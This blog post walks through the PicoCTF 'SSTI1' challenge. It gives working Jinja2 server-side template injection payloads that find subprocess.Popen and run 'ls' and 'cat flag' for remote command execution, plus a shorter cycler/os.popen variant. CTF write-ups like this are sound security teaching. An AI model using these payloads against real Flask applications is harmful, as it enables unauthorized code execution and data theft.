@@ -1,0 +1,146 @@
+---
+title: 'SSTI1 - A PicoCTF Challenge'
+description: 'A step-by-step walkthrough on exploiting Server-Side Template Injection (SSTI) to achieve code execution and capture the flag.'
+pubDate: 'Jun 03 2025'
+heroImage: '/blog-placeholder-5.jpg'
+categories: ["CTF", "PicoCTF", "Web Exploitation"]
+---
+
+## 🥧 Challenge Overview
+
+**SSTI1** is a web exploitation challenge that asks us to identify and exploit a Server-Side Template Injection (SSTI) vulnerability to retrieve a flag.
+
+We’re given a web interface that includes an input form:
+
+<img src="/ssti1/webview.png" alt="SSTI1 Challenge" style={{ width: "100%" }} />
+
+Our task is to use this input to run code on the server and ultimately access the flag.
+
+---
+
+## 🔍 Required Understanding
+
+To solve this challenge, we need to understand how Server-Side Template Injection works. SSTI happens when unsanitized user input is passed directly into a template engine like Jinja2, enabling us to inject and evaluate code.
+
+A good way to test for SSTI is to inject simple payloads:
+
+```jinja
+{{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}
+```
+
+When we input `{{7*7}}`, the output was `49`, confirming that the application is using **Jinja2** as its template engine:
+
+<img src="/ssti1/77.png" alt="SSTI1 7x7 Result" style={{ width: "100%" }} />
+
+---
+
+## 🧩 Exploitation Steps
+
+### 1. Check the Jinja2 Config
+
+To verify our environment, we inspect the config object:
+
+```jinja
+{{ config }}
+```
+
+It prints out a typical Flask configuration object. Since nothing sensitive is exposed, we proceed.
+
+---
+
+### 2. Enumerate Python Objects
+
+We attempt to enumerate all subclasses of Python’s `object` type using the following payload:
+
+```jinja
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+This reveals many internal Python classes — one of which is the critical:
+
+```
+<class 'subprocess.Popen'>
+```
+
+This class allows us to execute system commands.
+
+---
+
+### 3. Find the Index of `subprocess.Popen`
+
+To invoke the `Popen` class, we need its exact index in the list. So we enumerate them with:
+
+```jinja
+{% for i in range(0, 450) %}
+{{ i }} - {{ ''.__class__.__mro__[1].__subclasses__()[i] }}
+{% endfor %}
+```
+
+This reveals:
+
+```text
+356 - <class 'subprocess.Popen'>
+```
+
+Perfect. We’ll use index 356 in the next step.
+
+---
+
+### 4. Execute Commands
+
+We test code execution by listing files using `Popen`:
+
+```jinja
+{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate()[0].decode() }}
+```
+
+The output confirms that we successfully ran a system command and got:
+
+```text
+__pycache__ app.py flag requirements.txt
+```
+
+---
+
+### 5. Read the Flag
+
+Now that we have working RCE, we can read the `flag` file:
+
+```jinja
+{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0].decode() }}
+```
+
+And there it is — the flag.
+
+<img src="/ssti1/flag.png" alt="SSTI1 Flag" style={{ width: "100%" }} />
+
+---
+
+## 💡 Nice to Know
+
+An alternative way to access system commands uses the `cycler` module:
+
+```jinja
+{{ cycler.__init__.__globals__['os'].popen('cat flag').read() }}
+```
+
+### 🤔 Why Not Use `cycler` First?
+
+In CTFs or real-world apps, the `cycler` method may not always be available. That’s why going through Python's subclass hierarchy is more reliable.
+
+| Method                                    | Strengths                                | Weaknesses                                           |
+|------------------------------------------|------------------------------------------|------------------------------------------------------|
+| `{{ cycler.__init__.__globals__['os'] }}` | ✅ Short and simple                       | ❌ Might be sandboxed or disabled in secure setups   |
+| `{{ subclasses()[index] }}`               | ✅ Works in hardened environments         | ❌ Slightly more work to find the correct index      |
+
+---
+
+## 🧠 Final Thoughts
+
+This challenge shows how powerful SSTI can be when user input is handled carelessly. By understanding how Jinja2 templates interact with Python’s object system, we’re able to move from simple arithmetic to full command execution.
+
+---
+
+## 🔗 Challenge Link
+
+[SSTI1 | PicoCTF Challenge](https://play.picoctf.org/practice/challenge/492?originalEvent=74&page=1)
